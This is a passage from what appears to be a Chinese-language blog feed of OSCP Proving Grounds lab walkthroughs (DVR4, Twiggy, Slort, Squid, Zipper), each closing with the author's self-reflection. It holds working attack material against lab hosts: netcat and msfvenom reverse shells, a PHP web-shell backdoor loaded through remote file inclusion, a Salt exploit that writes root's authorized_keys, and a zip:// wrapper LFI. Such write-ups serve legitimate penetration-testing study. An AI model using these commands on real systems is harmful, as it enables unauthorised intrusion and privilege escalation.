DumpStack.log.tmp                                                                           </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">4</span>:<span class="number">52</span> AM           <span class="number">2690</span> output.txt                                                                                  </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM      <span class="number">671088640</span> pagefile.sys                                                                                </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM      <span class="number">268435456</span> swapfile.sys                                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> <span class="string">&#x27;.\ProgramData\PY_Software\Argus Surveillance DVR\&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\ProgramData\PY_Software\Argus Surveillance DVR&gt; <span class="built_in">dir</span> <span class="literal">-force</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\ProgramData\PY_Software\Argus Surveillance DVR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">26</span> AM                Gallery                                                                                     </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">24</span> AM                Images                                                                                      </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">26</span> AM                Logs                                                                                        </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">28</span> AM             <span class="number">38</span> Argus Surveillance DVR.DVRSes                                                               </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">45</span> AM           <span class="number">5782</span> DVRParams.ini                                                                               </span><br></pre></td></tr></table></figure>

<p><code>cat DVRParams.ini</code>看下内容， 这次展示了很多内容，看来是通过cur查看到时候展示行数有限，被截断了。在user部分有administrator的密码密文</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-109.png.png"></p>
<p>回到50130.py破解之</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python <span class="number">50130</span>.py </span><br><span class="line">/home/kali/Tools/pg/DVR4/<span class="number">50130</span>.py:<span class="number">27</span>: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\_&#x27;</span></span><br><span class="line">  banner = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#########################################</span></span><br><span class="line"><span class="string">#    _____ Surveillance DVR 4.0         #</span></span><br><span class="line"><span class="string">#   /  _  \_______  ____  __ __  ______ #</span></span><br><span class="line"><span class="string">#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #</span></span><br><span class="line"><span class="string"># /    |    \  | \/ /_/  &gt;  |  /\___ \  #</span></span><br><span class="line"><span class="string"># \____|__  /__|  \___  /|____//____  &gt; #</span></span><br><span class="line"><span class="string">#         \/     /_____/            \/  #</span></span><br><span class="line"><span class="string">#        Weak Password Encryption       #</span></span><br><span class="line"><span class="string">############ @deathflash1411 ############</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] ECB4:1</span></span><br><span class="line"><span class="string">[+] 53D1:4</span></span><br><span class="line"><span class="string">[+] 6069:W</span></span><br><span class="line"><span class="string">[+] F641:a</span></span><br><span class="line"><span class="string">[+] E03B:t</span></span><br><span class="line"><span class="string">[+] D9BD:c</span></span><br><span class="line"><span class="string">[+] 956B:h</span></span><br><span class="line"><span class="string">[+] FE36:D</span></span><br><span class="line"><span class="string">[+] BD8F:0</span></span><br><span class="line"><span class="string">[+] 3CD9:g</span></span><br><span class="line"><span class="string">[-] D9A8:Unknown</span></span><br></pre></td></tr></table></figure>

<p>最后一个字符没有解出来，看 代码注释，是作者没加特殊字符的编码信息</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-108.png.png"></p>
<p>特殊字符不多，以administrator用户执行反弹shell, 输入密码一个个试下，输入$时，成功获取shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /env /profile /user:DVR4\Administrator &quot;C:\temp\nc.exe -e cmd.exe 192.168.118.14 443</span><br><span class="line">Enter the password for DVR4\Administrator:  </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-nvlp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.234</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.140.179</span>] <span class="number">51874</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19044.1645</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\ProgramData\PY_Software\Argus Surveillance DVR&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">dvr4\administrator</span><br></pre></td></tr></table></figure>

<p>官方walkThrough中是在user页面新建了一个user用户，密码设为全部字符 <code>!@#$%^&amp;*()</code>在通过配置文件里的密码对比得到密码明文</p>
<p>之前一直以为runas只能在有桌面环境的前提下使用</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-111.png.png"></p>
<h3 id="gsm-codec-dll提权"><a href="#gsm-codec-dll提权" class="headerlink" title="gsm_codec.dll提权"></a><code>gsm_codec.dll</code>提权</h3><p>靶机上没有gcc环境，未测试</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>本文是我在逐步看了hits之后依然没有成功后，看了完成walkThrough后，重头重新打靶的记录，<strong>但是更令我感到挫败和沮丧的是如果重新遇到这个靶机，并且整体思路、步骤正确的情况下我仍然可能拿不下这台靶机，它让我推翻自己之前解决问题的方式</strong></p>
<ol>
<li><p>信息收集阶段</p>
</li>
<li><ol>
<li>在看到了arugs surveillance存在的几个漏洞之后，我放弃了继续在web页面上继续收集信息，导致没能找到viewer用户</li>
</ol>
</li>
<li><ol start="2">
<li>弱密码破解poc看了之后发现用不到，并没有认真看代码，忽略了其中的配置文件注释，也尝试读取这个文件</li>
</ol>
</li>
<li><ol start="3">
<li><strong>更为严重的是：即使在这一步我看到了配置文件路径，并且测试读了配置文件，但是没有有效信息，在后续拿到viewer shell之后，我还是不会想到再去检查一次这个配置文件，因为在我的脑子里是排除法，一直在排查自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担</strong></li>
</ol>
</li>
<li><p>提权阶段</p>
</li>
<li><ol start="4">
<li>在发现seShutdownPrivilege无法提权，并且winpeas没有找到有用信息后，完全没了思路，哪怕再去搜一下DRV4的相关信息呢，过于依赖工具了。</li>
</ol>
</li>
<li><ol start="5">
<li><strong>更为严重的是：即使在这一步我成功找到了配置文件，我相信自己仍然不会第一时间想到searchSploit已经发现的exploit, 因为在我的脑海是排查法，一直在排除自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担</strong></li>
</ol>
</li>
</ol>
<p><strong>信息收集很重要，不要忽略任何信息，不要做减法排查，从最有可能的点着手，而不是像自己以前优先排除后聚焦的解决问题方式</strong></p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Twiggy</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-92.png.png"></p>
<p>8000端口信息</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-90.png.png"></p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p><a href="https://gist.github.com/momenbasel/b883d039bb28b18ccd7efe92a91d98f8c">https://gist.github.com/momenbasel/b883d039bb28b18ccd7efe92a91d98f8c</a></p>
<p><a href="https://github.com/jasperla/CVE-2020-11651-poc">https://github.com/jasperla/CVE-2020-11651-poc</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">pip3 install salt</span><br><span class="line">python slat_rce.py -m <span class="number">192.168</span><span class="number">.156</span><span class="number">.62</span> -p <span class="number">4506</span> --upload-src /home/kali/.ssh/id_rsa.pub --upload-dest ../../../../root/.ssh/authorized_keys</span><br><span class="line">python slat_rce.py -m <span class="number">192.168</span><span class="number">.156</span><span class="number">.62</span> -p <span class="number">4505</span> -r ../../../../root/.ssh/authorized_keys</span><br><span class="line">成功写入</span><br><span class="line">ssh root@<span class="number">192.168</span><span class="number">.156</span><span class="number">.62</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-91.png.png"></p>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>80端口有很多信息，其中还有admin后台，不要直接跳入rabbit hole，先收集所有信息，不熟悉的信息及时搜索。</p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Slort</title>
    <url>/post/20250311024935.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>medium</p>
<h1 id="Scans"><a href="#Scans" class="headerlink" title="Scans"></a>Scans</h1><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-148.png.png"></p>
<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>点击phpinfo, 允许远程包含，能找到文件包含的话可以实现rce</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-146.png.png"></p>
<h3 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h3><p>403 only avaiable from local network</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-144.png.png"></p>
<h2 id="路径扫描"><a href="#路径扫描" class="headerlink" title="路径扫描"></a>路径扫描</h2><p><code>gobuster dir -w /usr/share/wordlists/dirb/big.txt -u</code> <code>http://192.168.111.53:8080</code> <code>-t 40</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-145.png.png"></p>
<p>发现site、img、dashboard、xampp</p>
<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>访问 <code>http://192.168.111.53:8080/site/</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-149.png.png"></p>
<p>使用kali自带的backdoor.php文件：</p>
<p><code>cp /usr/share/webshells/php/simple-backdoor.php backdoor.php</code> 然后python 启动webserver</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>https://www.revshells.com/</code> 生成反弹shell powershell base64脚本，远程文件包含执行反弹shell命令, 接收到webshell</p>
<p><code>http://192.168.111.53:8080/site/index.php?page=http://192.168.45.165/web/backdoor.php&amp;cmd=powershell%20-e...</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="literal">-nvlp</span> <span class="number">8080</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">8080</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.165</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.111.53</span>] <span class="number">50011</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\site&gt; whoami</span><br><span class="line">slort\rupert</span><br></pre></td></tr></table></figure>

<h2 id="phpinfo-lfi"><a href="#phpinfo-lfi" class="headerlink" title="phpinfo lfi"></a>phpinfo lfi</h2><p>如果不能远程文件包含的话，也可以利用phpinfo实现本地包含rce, 可参考： <a href="/post/20250311023739.html" title="PHP LFI abuse">PHP LFI abuse</a></p>
<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><p>winpeas收集信息，在大片的xampp有backup&#x2F;TFTP.EXE</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-150.png.png"></p>
<p>进入&#x2F;backup文件夹下查看， info.txt中提示每5分钟执行一次，可以替换TFTP.EXE为反弹shell exe</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-147.png.png"></p>
<p>msf生成反弹shell exe：</p>
<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o TFTP.EXE</code></p>
<p>下载替换 <code>backup/TFTP.EXE</code> 等待片刻后，获得system shell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="literal">-nvlp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.165</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.111.53</span>] <span class="number">52422</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19042.1387</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br><span class="line">C:\WINDOWS\system32&gt;</span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">slort\administrator</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>提权手动收集信息要细致，没有发现C:\backup文件夹，检查了public, rupert, xammp文件夹，但是却忽略了C目录，实在不应该，<strong>要细致啊</strong></li>
<li>winpeas的输出中，也同样没有发现backup&#x2F;TFTP.EXE文件，这部分知识简单扫了一眼都是C:\xampp 下面是 &#x2F;users, <strong>一定要细致啊</strong></li>
<li>在看了hits后提示find backup， 在C：下找到backup， 查看info.txt， 但是眼瞎没看到run every 5 minute，实际上我确定是我自己选择性忽略了，因为在第一次cat之后，我甚至没注意看执行的是什么命令。 为什么？把前面当做命令提示符了？ 想着先分析一下backup.txt? 看到run…认为是系统输出的信息了？</li>
</ol>
<p><strong>细心是关键，或许我这么粗心不适合做渗透测试？</strong></p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Squid</title>
    <url>/post/20250220003030.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-128.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">- os</span><br><span class="line">OS<span class="punctuation">:</span> Windows <span class="number">7</span> Ultimate N <span class="number">7600</span></span><br><span class="line">OS version<span class="punctuation">:</span> &#x27;<span class="number">6.1</span>&#x27;</span><br><span class="line">OS release<span class="punctuation">:</span> &#x27;&#x27;</span><br><span class="line">OS build<span class="punctuation">:</span> &#x27;<span class="number">7600</span>&#x27;</span><br><span class="line">Native OS<span class="punctuation">:</span> Windows <span class="number">7</span> Ultimate N <span class="number">7600</span></span><br><span class="line">Native LAN manager<span class="punctuation">:</span> Windows <span class="number">7</span> Ultimate N <span class="number">6.1</span></span><br><span class="line"></span><br><span class="line">- ports</span><br><span class="line">- <span class="number">80</span></span><br><span class="line">    HTTPServer<span class="punctuation">[</span>GoAhead-Webs<span class="punctuation">]</span></span><br><span class="line">    HP Power Manager</span><br><span class="line">    Cyclade</span><br><span class="line">    + /cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|ls|<span class="punctuation">:</span> DailyDose <span class="number">1.1</span> is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See<span class="punctuation">:</span> OSVDB<span class="number">-2799</span></span><br><span class="line">    + /cgi-bin-sdb/dose.pl?daily&amp;somefile.txt&amp;|ls|<span class="punctuation">:</span> DailyDose <span class="number">1.1</span> is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See<span class="punctuation">:</span> OSVDB<span class="number">-2799</span></span><br><span class="line">    + /forum/memberlist.php?s=<span class="number">23</span>c37cf1af5d2ad05f49361b0407ad9e&amp;what=\<span class="string">&quot;&gt;\&quot;&lt;script&gt;javascript:alert(document.cookie)&lt;/script&gt;: Vbulletin 2.2.9 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3280</span></span><br><span class="line"><span class="string">    + /docs/&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;: Nokia Electronic Documentation is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0801</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 139 </span></span><br><span class="line"><span class="string">    [V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45</span></span><br><span class="line"><span class="string">    [92m[+] Got domain/workgroup name: WORKGROUP[0m</span></span><br><span class="line"><span class="string">    [92m[+] Full NetBIOS names information:</span></span><br><span class="line"><span class="string">    - KEVIN           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span></span><br><span class="line"><span class="string">    - WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span></span><br><span class="line"><span class="string">    - WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span></span><br><span class="line"><span class="string">    - KEVIN           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span></span><br><span class="line"><span class="string">    - WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span></span><br><span class="line"><span class="string">    - ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span></span><br><span class="line"><span class="string">    - MAC Address = 00-50-56-AB-F9-35[0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 445</span></span><br><span class="line"><span class="string">[V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45</span></span><br><span class="line"><span class="string">  SMB 1.0: true</span></span><br><span class="line"><span class="string">  SMB 2.02: true</span></span><br><span class="line"><span class="string">  SMB 2.1: true </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  smb-vuln-ms17-010: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2017-0143</span></span><br><span class="line"><span class="string">|     Risk factor: HIGH</span></span><br><span class="line"><span class="string">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span></span><br><span class="line"><span class="string">|        servers (ms17-010).</span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 3389 </span></span><br><span class="line"><span class="string">    ms-wbt-server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 3573</span></span><br><span class="line"><span class="string">    tag-ups-1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- udp 137</span></span><br><span class="line"><span class="string">    netbios-ns</span></span><br></pre></td></tr></table></figure>

<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>题目兔子洞较多</p>
<ol>
<li>smb 扫描可能有永恒之蓝漏洞，多次尝试未果</li>
<li>web</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> hp power manager     no rce</span><br><span class="line"><span class="number">2.</span> cyclade              no rce</span><br><span class="line"><span class="number">3.</span> dailyDose            rce 但是利用不成功  http<span class="punctuation">:</span><span class="comment">//192.168.197.45/cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|whoami|</span></span><br><span class="line"><span class="number">4.</span> goahead web server   no rce</span><br></pre></td></tr></table></figure>

<ul>
<li>dailyDose 利用失败</li>
<li>cyclade 不是系统级的漏洞</li>
<li>goahead 版本位置，尝试两个rce exploit未果</li>
<li>hp power manager 无rce</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ss hp power manager</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                    |  Path</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Flying Dog Software Powerslave <span class="number">4.3</span> Portalmanager - &#x27;sql_id&#x27; Information Disclosure                                                | php/webapps/<span class="number">23163.</span>txt</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit)                                           | windows/remote/<span class="number">16785.</span>rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow                        | windows/remote/<span class="number">10099.</span>py</span><br><span class="line">HP Power Manager - &#x27;formExportDataLogs&#x27; Remote Buffer Overflow (Metasploit)                                                       | cgi/remote/<span class="number">18015.</span>rb</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes<span class="punctuation">:</span> No Results</span><br><span class="line">Papers<span class="punctuation">:</span> No Results</span><br></pre></td></tr></table></figure>

<p>看题解是利用缓冲区溢出漏洞</p>
<p>坏字符</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-127.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -b <span class="string">&quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot;</span> LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> LPORT=<span class="number">4444</span> -e x86/alpha_mixed -f c</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> LPORT=<span class="number">4444</span> EXITFUNC=thread -b <span class="string">&quot;\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5&quot;</span> -e  x86/alpha_mixed -f python</span><br></pre></td></tr></table></figure>

<p>替换n00bnoob以下部分</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-126.png.png"></p>
<p>最后也没成功</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>web 弱口令admin:admin进入能看到hp power manager 的版本号，没有第一时间搜索vulns, 心理过于依赖searchsploit了， 并且认为只有rce可以利用，需要积累经验</li>
<li>在看似可利用的点较多时，多次尝试失败导致逐渐不信任前面是不是操作有问题</li>
<li>看到用户名密码后应该搜索默认密码，而不是admin:admin手动撞大运</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Zipper</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Hard</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[*] ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.2</span>p1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">80.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.41</span> (Ubuntu)</span><br><span class="line">    Title: Zipperpo</span><br><span class="line">    Bootstrap[<span class="number">4.0</span><span class="number">.0</span>]</span><br></pre></td></tr></table></figure>

<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-93.png.png"></p>
<p>查看页面源代码，发现home处的跳转链接是 index.php?file&#x3D;home</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-97.png.png"></p>
<p>可能存在任意文件包含漏洞，访问&#x2F;index.php?file&#x3D;index 服务器返回500,确认存在文件包含，那问题是该怎么上传恶意文件呢？</p>
<p><strong>尝试1：</strong> 上传文件后有下载链接，文件内容中会包含明文的文件名，尝试把文件名改成webshell，上传后，index.php?file&#x3D;uploads&#x2F;upload_xxxx.zip, 失败</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-94.png.png"></p>
<p><strong>尝试2：</strong> 远程文件包含，index.php?file&#x3D;<a href="http://192.169.45.234:8000/shell.php">http://192.169.45.234:8000/shell.php</a> 失败</p>
<p><strong>尝试3：</strong> 猜上传之后的文件名，当然都失败了</p>
<p>查看提示，可以使用wrapper读取源码</p>
<p><code>http://192.168.212.229/index.php?file=php://filter/convert.base64-encode/resource=home</code></p>
<p>输出base64编码的源码，解析后看到include了upload.php</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-95.png.png"></p>
<p>继续查看upload文件，会把上传的文件重命名： 时间+随机数.tmp， 看到这第一想法是写个脚本爆破随机数，但是随机数范围太大了（0-4294967295），放弃了这个念头。而实际登录机器之后，发现每分钟会清理.tmp文件。</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-98.png.png"></p>
<p>再次查看hits, 方法是使用zip:&#x2F;&#x2F; warpper</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.109</span><span class="number">.128</span>/index.php?file=<span class="built_in">zip</span>://uploads/upload_1627661999.<span class="built_in">zip</span>%23shell</span><br></pre></td></tr></table></figure>

<p>msfvenom生成反弹shell php文件，上传后 执行得到shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">80</span> ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.212</span><span class="number">.229</span>] <span class="number">33570</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><p>上传linpeas收集信息，发现定时任务 <code>* * * * * root bash /opt/backup.sh</code></p>
<p>查看脚本所属为root, 没有修改权限，查看内容是把密码备份，查看日志得到密码：<code>WildCardsGoingWild</code>, 验证密码为root密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">www-data@zipper:/var/www/html$ cd /opt</span><br><span class="line">cd /opt</span><br><span class="line">www-data@zipper:/opt$ ls</span><br><span class="line">ls</span><br><span class="line">backup.sh  backups</span><br><span class="line">www-data@zipper:/opt$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> Aug <span class="number">12</span>  <span class="number">2021</span> .</span><br><span class="line">drwxr-xr-x <span class="number">20</span> root root <span class="number">4096</span> Aug <span class="number">12</span>  <span class="number">2021</span> ..</span><br><span class="line">-rwxr-xr-x  <span class="number">1</span> root root  <span class="number">153</span> Aug <span class="number">12</span>  <span class="number">2021</span> backup.sh</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> Feb <span class="number">17</span> <span class="number">16</span>:<span class="number">56</span> backups</span><br><span class="line">www-data@zipper:/opt$ cat backup.sh</span><br><span class="line">cat backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">password=`cat /root/secret`</span><br><span class="line">cd /var/www/html/uploads</span><br><span class="line">rm *.tmp</span><br><span class="line">7za a /opt/backups/backup.<span class="built_in">zip</span> 